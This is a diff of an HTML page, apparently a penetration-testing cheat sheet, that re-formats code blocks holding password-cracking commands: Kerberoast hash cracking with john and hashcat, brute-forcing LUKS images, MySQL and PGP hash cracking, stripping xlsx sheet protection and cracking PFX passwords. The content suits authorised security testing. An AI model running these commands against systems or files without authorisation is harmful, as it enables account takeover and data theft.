+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#f92672">=</span>krb5tgs --wordlist<span style="color:#f92672">=</span>passwords_kerb.txt hashes.kerberoast
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">13100</span> --force -a <span style="color:#ae81ff">0</span> hashes.kerberoast passwords_kerb.txt
+</span></span><span style="display:flex;"><span>./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
+</span></span></code></pre></div><h3 id="lucks-image">
   Lucks image
   <a class="anchor" href="#lucks-image">#</a>
 </h3>
@@ -1711,33 +1711,33 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
   Method 1
   <a class="anchor" href="#method-1">#</a>
 </h4>
-<pre tabindex="0"><code>Install: https://github.com/glv2/bruteforce-luks
-bruteforce-luks -f ./list.txt ./backup.img
-cryptsetup luksOpen backup.img mylucksopen
-ls /dev/mapper/ #You should find here the image mylucksopen
-mount /dev/mapper/mylucksopen /mnt
-</code></pre><h4 id="method-2">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Install: https://github.com/glv2/bruteforce-luks
+</span></span><span style="display:flex;"><span>bruteforce-luks -f ./list.txt ./backup.img
+</span></span><span style="display:flex;"><span>cryptsetup luksOpen backup.img mylucksopen
+</span></span><span style="display:flex;"><span>ls /dev/mapper/ <span style="color:#75715e">#You should find here the image mylucksopen</span>
+</span></span><span style="display:flex;"><span>mount /dev/mapper/mylucksopen /mnt
+</span></span></code></pre></div><h4 id="method-2">
   Method 2
   <a class="anchor" href="#method-2">#</a>
 </h4>
-<pre tabindex="0"><code>cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
-dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
-hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
-cryptsetup luksOpen backup.img mylucksopen
-ls /dev/mapper/ #You should find here the image mylucksopen
-mount /dev/mapper/mylucksopen /mnt
-Another Luks BF tutorial: http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1
-</code></pre><h3 id="mysql-1">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cryptsetup luksDump backup.img <span style="color:#75715e">#Check that the payload offset is set to 4096</span>
+</span></span><span style="display:flex;"><span>dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>backup.img of<span style="color:#f92672">=</span>luckshash bs<span style="color:#f92672">=</span><span style="color:#ae81ff">512</span> count<span style="color:#f92672">=</span><span style="color:#ae81ff">4097</span> <span style="color:#75715e">#Payload offset +1</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">14600</span> -a <span style="color:#ae81ff">0</span> luckshash  wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>cryptsetup luksOpen backup.img mylucksopen
+</span></span><span style="display:flex;"><span>ls /dev/mapper/ <span style="color:#75715e">#You should find here the image mylucksopen</span>
+</span></span><span style="display:flex;"><span>mount /dev/mapper/mylucksopen /mnt
+</span></span><span style="display:flex;"><span>Another Luks BF tutorial: http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h3 id="mysql-1">
   Mysql
   <a class="anchor" href="#mysql-1">#</a>
 </h3>
-<pre tabindex="0"><code>#John hash format
-&lt;USERNAME&gt;:$mysqlna$&lt;CHALLENGE&gt;*&lt;RESPONSE&gt;
-dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
-PGP/GPG Private key
-gpg2john private_pgp.key #This will generate the hash and save it in a file
-john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
-</code></pre><h3 id="dpapi-master-key">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#John hash format</span>
+</span></span><span style="display:flex;"><span>&lt;USERNAME&gt;:$mysqlna$&lt;CHALLENGE&gt;*&lt;RESPONSE&gt;
+</span></span><span style="display:flex;"><span>dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
+</span></span><span style="display:flex;"><span>PGP/GPG Private key
+</span></span><span style="display:flex;"><span>gpg2john private_pgp.key <span style="color:#75715e">#This will generate the hash and save it in a file</span>
+</span></span><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt ./hash
+</span></span></code></pre></div><h3 id="dpapi-master-key">
   DPAPI Master Key
   <a class="anchor" href="#dpapi-master-key">#</a>
 </h3>
@@ -1746,24 +1746,24 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
   Open Office Pwd Protected Column
   <a class="anchor" href="#open-office-pwd-protected-column">#</a>
 </h3>
-<pre tabindex="0"><code>If you have an xlsx file with a column protected by a password you can unprotect it:
-Upload it to google drive and the password will be automatically removed
-To remove it manually:
-unzip file.xlsx
-grep -R &#34;sheetProtection&#34; ./*
-# Find something like: &lt;sheetProtection algorithmName=&#34;SHA-512&#34;
-hashValue=&#34;hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg&#34; saltValue=&#34;U9oZfaVCkz5jWdhs9AA8nA&#34; spinCount=&#34;100000&#34; sheet=&#34;1&#34; objects=&#34;1&#34; scenarios=&#34;1&#34;/&gt;
-# Remove that line and rezip the file
-zip -r file.xls .
-</code></pre><h3 id="pfx-certificates">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>If you have an xlsx file with a column protected by a password you can unprotect it:
+</span></span><span style="display:flex;"><span>Upload it to google drive and the password will be automatically removed
+</span></span><span style="display:flex;"><span>To remove it manually:
+</span></span><span style="display:flex;"><span>unzip file.xlsx
+</span></span><span style="display:flex;"><span>grep -R <span style="color:#e6db74">&#34;sheetProtection&#34;</span> ./*
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Find something like: &lt;sheetProtection algorithmName=&#34;SHA-512&#34;</span>
+</span></span><span style="display:flex;"><span>hashValue<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg&#34;</span> saltValue<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;U9oZfaVCkz5jWdhs9AA8nA&#34;</span> spinCount<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100000&#34;</span> sheet<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> objects<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span> scenarios<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove that line and rezip the file</span>
+</span></span><span style="display:flex;"><span>zip -r file.xls .
+</span></span></code></pre></div><h3 id="pfx-certificates">
   PFX Certificates
   <a class="anchor" href="#pfx-certificates">#</a>
 </h3>
-<pre tabindex="0"><code># From https://github.com/Ridter/p12tool
-./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
-# From https://github.com/crackpkcs12/crackpkcs12
-crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
-</code></pre><h2 id="tools">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># From https://github.com/Ridter/p12tool</span>
+</span></span><span style="display:flex;"><span>./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># From https://github.com/crackpkcs12/crackpkcs12</span>
+</span></span><span style="display:flex;"><span>crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
+</span></span></code></pre></div><h2 id="tools">
   Tools
   <a class="anchor" href="#tools">#</a>
 </h2>
